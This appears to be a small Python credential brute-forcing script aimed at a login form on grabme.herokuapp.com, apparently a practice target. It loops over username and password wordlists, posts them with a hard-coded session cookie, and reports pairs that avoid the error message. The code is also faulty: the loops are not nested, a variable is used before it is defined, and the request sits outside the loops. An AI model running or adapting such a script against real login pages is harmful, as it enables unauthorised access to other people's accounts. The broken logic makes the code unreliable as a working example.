import requests
from colorama import Fore

# Got POST Form Type
# Copied As Curl
# Converted Curl To Python Requests Online

cookies = {
    'PHPSESSID': 'vjunihkrh0lsunkj7vf9k1ldj5f8j7ed',
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://grabme.herokuapp.com',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://grabme.herokuapp.com/target/',
    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,mr;q=0.6,pt;q=0.5',
}
        
# Usernames In A List Format
users = [ x.strip() for x in open('users.txt').read().split('\n') if x ]
# Passwords In A List Format
passwords = [x.strip() for x in open('passwords.txt').read().split('\n') if x]

# Looping
for password in passwords:
    data = {
      'username': user,
      'password': password,
      'submit': 'Connexion'
}

for user in users:
    data = {
      'username': user,
      'password': password,
      'submit': 'Connexion'
}

response = requests.post('http://grabme.herokuapp.com/target/', headers=headers, cookies=cookies, data=data, verify=False)

# Checking Response To Get Correct Password.

if "incorrect username or password" not in response.text:
    print(Fore.GREEN + "Credentials Are Likely Found: ")
    print(Fore.GREEN + "Username: ", user)
    print(Fore.GREEN + "Password: ", password)
